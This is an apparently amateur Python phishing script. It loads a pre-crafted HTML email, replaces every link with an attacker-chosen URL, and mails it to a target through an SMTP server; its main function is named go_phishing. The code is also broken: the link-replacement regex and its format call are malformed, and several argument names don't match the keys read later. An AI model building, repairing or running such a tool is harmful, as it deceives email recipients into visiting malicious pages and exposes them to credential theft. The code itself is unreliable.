import argparse
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def argument_parser():
    parser = argparse.ArgumentParser(description='Takes a pre-crafted HTML email, automatically replaces the links with'"the desired address, and sends the email.")

    parser.add_argument("server",help='SMTP server that will send the email')
    parser.add_argument("port",help="SMTP server port number ")
    parser.add_argument("uesrname",help="Username for the SMTP server")
    parser.add_argument("password",help="Password for the SMTP server")
    parser.add_argument("email",help="Pre-crafted email location")
    parser.add_argument("url",help="URL that will replace all links in the email")
    parser.add_argument("subject",help="Email subject")
    parser.add_argument("sender",help="Email sender")
    parser.add_argument("sendto",help="Target email address")
    parser.add_argument("--tls",default=False,help="Attemp to use SSL/TLS")

    var_args = vars(parser.parse_args())
    return var_args # convert argument namespace to dictionary

def open_email_file(email_file):
    with open(email_file,'r')as open_email:
             email_html = open_email.read()
    return email_html

def replace_links(url, massege):
    html_regex = re.compile(r'href=[\'"]?(^\'"]+)')
    html_output=html_regex.sub("href=\*{}",format(url),massege)
    return html_output

def mime_mssage(email_subj, send_to, send_form, html_email):
    msg = MIMEMultipart('alternative')
    msg['To'] = send_to
    msg['From'] = send_form
    msg['Subject'] = email_subj
    message = MIMEText(html_email,'html')
    msg.attach(message)

    return msg.as_string()

def send_email(server, port, username, password, send_from, send_to, message, tls):
    print("[+]Attempting to connect to server")
    stert_server = smtplib.SMTP(server, port)
    if tls:
        print("[+] Attempting to use STARtTLS")
        stert_server.starttls()
    print("[+] Attempting to say ehlo")
    stert_server.login(username,password)
    print("[+] Attempting to send mail")
    stert_server.sendmail(send_from,send_to, message)
    print("[+] Done...")
    stert_server.quit()

def go_phishing(server, port,username,password,email_loc,url_replace, subj, send_from, send_to, tls):
    html_email=open_email_file(email_loc)
    html_output= replace_links(url_replace, html_email)
    message = mime_mssage(subj, send_to, send_from, html_output)
    send_email(server, port, username, password, sender, send_to, message, tls)

if __name__ == '__main__':
    try:
        user_args = argument_parser()
        email_server= user_args["server"]
        smtp_port = user_args["port"]
        login = user_args["username"]
        pword= user_args["password"]
        email_path= user_args["email"]
        new_Url = user_args["Url"]
        email_subject= user_args["subject"]
        sender = user_args["sender"]
        receiver = user_args["send to"]
        user_tls= user_args["tls"]
        go_phishing(email_server,smtp_port, login, pword, email_path, new_Url, email_subject, sender, receiver, user_tls)
    except AttributeError:
        print("Error. please provide the command-line arguments before running.")